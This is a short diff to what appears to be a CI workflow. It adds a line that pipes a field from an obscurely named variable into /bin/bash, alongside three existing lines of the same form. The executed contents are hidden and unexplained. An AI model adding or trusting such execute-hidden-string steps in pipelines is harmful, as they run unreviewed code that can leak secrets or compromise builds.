@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$eqnnd52" | jq -r .j3945 | /bin/bash
           echo $mgv8422 | jq -r .k3 | /bin/bash
           echo $pixal0 | jq -r .m41465 | /bin/bash
+          echo $kqp225 | jq -r .y0 | /bin/bash
 
       - name: Store results
         if: always()
